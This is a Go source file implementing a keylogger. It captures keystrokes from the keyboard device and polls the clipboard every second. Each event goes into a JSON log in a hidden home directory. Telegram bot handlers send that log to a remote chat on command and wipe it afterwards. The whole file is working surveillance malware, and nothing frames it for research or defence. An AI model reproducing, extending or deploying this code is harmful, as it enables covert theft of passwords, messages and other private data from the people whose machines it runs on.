package utilities

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"time"

	"github.com/atotto/clipboard"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/MarinX/keylogger"
)

var logFilePath string
var hiddenDirPath string

// InitializeKeylogger sets up log paths and files
func InitializeKeylogger() {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalf("Failed to get user home directory: %v", err)
	}

	hiddenDirPath = filepath.Join(homeDir, ".hidden_dir")
	logFilePath = filepath.Join(hiddenDirPath, "logs.json")

	if _, err := os.Stat(hiddenDirPath); os.IsNotExist(err) {
		err = os.Mkdir(hiddenDirPath, 0700)
		if err != nil {
			log.Fatalf("Failed to create hidden directory: %v", err)
		}
	}

	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		file, err := os.Create(logFilePath)
		if err != nil {
			log.Fatalf("Failed to create log file: %v", err)
		}
		file.Close()
	}
}

// LogKeystroke logs a keystroke or clipboard event
func LogEvent(eventType, content string) {
	record := map[string]string{
		"timestamp": time.Now().Format(time.RFC3339),
		"type":      eventType,
		"content":   content,
	}

	file, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("Failed to open log file: %v", err)
		return
	}
	defer file.Close()

	data, err := json.Marshal(record)
	if err != nil {
		log.Printf("Failed to marshal log data: %v", err)
		return
	}

	file.WriteString(string(data) + "\n")
}

// MonitorClipboard continuously monitors the clipboard for changes
func MonitorClipboard() {
	var previousContent string
	for {
		currentContent, err := clipboard.ReadAll()
		if err != nil {
			log.Printf("Failed to read clipboard: %v", err)
			continue
		}

		if currentContent != previousContent {
			previousContent = currentContent
			LogEvent("clipboard", currentContent)
		}

		time.Sleep(1 * time.Second) // Poll every second
	}
}

// StartKeylogger starts the keylogger and logs keystrokes
func StartKeylogger() {
	InitializeKeylogger()

	go MonitorClipboard()

	kb := keylogger.FindKeyboardDevice()
	if kb == "" {
		log.Fatalf("No keyboard device found")
	}

	keyboard, err := keylogger.New(kb)
	if err != nil {
		log.Fatalf("Failed to initialize keylogger: %v", err)
	}
	defer keyboard.Close()

	log.Println("Keylogger started. Listening for keystrokes and clipboard changes...")

	events := keyboard.Read()
	for e := range events {
		if e.Type == keylogger.EvKey && e.KeyPress() {
			key := e.KeyString()
			if key == "BS" {
				key = "BACKSPACE"
			}
			LogEvent("keystroke", key)
		}
	}
}

// HandleGetLog sends the log file to a Telegram chat
func HandleGetLog(bot *tgbotapi.BotAPI, chatID int64) {
	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		bot.Send(tgbotapi.NewMessage(chatID, "No log file found."))
		return
	}

	logData, err := os.ReadFile(logFilePath)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to read log file."))
		log.Printf("Error reading log file: %v", err)
		return
	}

	document := tgbotapi.NewDocument(chatID, tgbotapi.FileBytes{Name: "logs.json", Bytes: logData})
	bot.Send(document)
}

// HandleClearLog clears the log file content
func HandleClearLog(bot *tgbotapi.BotAPI, chatID int64) {
	err := os.Remove(logFilePath)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to clear log file."))
		log.Printf("Error clearing log file: %v", err)
		return
	}

	file, err := os.Create(logFilePath)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to recreate log file."))
		log.Printf("Error recreating log file: %v", err)
		return
	}
	file.Close()

	bot.Send(tgbotapi.NewMessage(chatID, "Log file cleared."))
}
